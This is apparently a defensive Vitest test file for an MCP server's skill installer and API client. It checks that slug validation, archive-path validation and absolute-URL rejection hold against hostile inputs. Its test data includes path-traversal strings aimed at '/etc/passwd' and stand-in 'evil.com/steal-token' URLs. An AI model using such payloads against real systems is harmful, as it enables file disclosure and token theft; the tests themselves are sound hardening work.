/**
 * Adversarial tests — edge cases, bad inputs, and security boundaries.
 *
 * Covers hardening fixes from the MCP server smoke test audit:
 * - Path traversal via relative() check instead of startsWith()
 * - apiGet/apiPost reject absolute URLs (prevent URL override)
 * - Slug validation edge cases
 * - Download URL HTTPS enforcement
 */

import { describe, it, expect, vi } from "vitest";
import { validateSlug, validateArchiveMembers } from "../installer.js";
import { apiGet, apiPost } from "../api-client.js";

// ---------- Slug validation ----------

describe("validateSlug adversarial", () => {
  it("rejects empty string", () => {
    expect(validateSlug("")).toBe(false);
  });

  it("rejects whitespace-only", () => {
    expect(validateSlug("   ")).toBe(false);
  });

  it("rejects uppercase", () => {
    expect(validateSlug("MySkill")).toBe(false);
  });

  it("rejects underscores", () => {
    expect(validateSlug("my_skill")).toBe(false);
  });

  it("rejects dots", () => {
    expect(validateSlug("my.skill")).toBe(false);
  });

  it("rejects path traversal", () => {
    expect(validateSlug("../../etc/passwd")).toBe(false);
  });

  it("rejects leading hyphen", () => {
    expect(validateSlug("-my-skill")).toBe(false);
  });

  it("rejects spaces", () => {
    expect(validateSlug("my skill")).toBe(false);
  });

  it("rejects slashes", () => {
    expect(validateSlug("author/slug")).toBe(false);
  });

  it("accepts valid slug", () => {
    expect(validateSlug("my-skill-123")).toBe(true);
  });
});

// ---------- Archive member validation (prefix attack) ----------

describe("validateArchiveMembers adversarial", () => {
  it("rejects absolute paths", () => {
    expect(() =>
      validateArchiveMembers(["/etc/passwd"], "/tmp/install")
    ).toThrow("absolute path");
  });

  it("rejects .. traversal", () => {
    expect(() =>
      validateArchiveMembers(["../../etc/passwd"], "/tmp/install")
    ).toThrow("..");
  });

  it("rejects entries resolving outside via prefix attack", () => {
    // "a-malicious" would startsWith("/tmp/install/a") if using naive startsWith
    // but relative() correctly returns ".." prefix
    expect(() =>
      validateArchiveMembers(
        ["../install-malicious/payload"],
        "/tmp/install"
      )
    ).toThrow();
  });

  it("rejects backslash traversal", () => {
    expect(() =>
      validateArchiveMembers(["..\\..\\etc\\passwd"], "/tmp/install")
    ).toThrow();
  });

  it("accepts valid nested paths", () => {
    expect(() =>
      validateArchiveMembers(
        ["SKILL.md", "src/main.ts", "src/utils/helper.ts"],
        "/tmp/install"
      )
    ).not.toThrow();
  });
});

// ---------- apiGet/apiPost path validation ----------

describe("apiGet absolute URL rejection", () => {
  it("rejects absolute http URL", async () => {
    await expect(
      apiGet("http://evil.com/steal-token")
    ).rejects.toThrow("must start with");
  });

  it("rejects absolute https URL", async () => {
    await expect(
      apiGet("https://evil.com/steal-token")
    ).rejects.toThrow("must start with");
  });

  it("rejects relative path without leading slash", async () => {
    await expect(
      apiGet("v1/search")
    ).rejects.toThrow("must start with");
  });
});

describe("apiPost absolute URL rejection", () => {
  it("rejects absolute URL", async () => {
    await expect(
      apiPost("http://evil.com/steal-token")
    ).rejects.toThrow("must start with");
  });
});
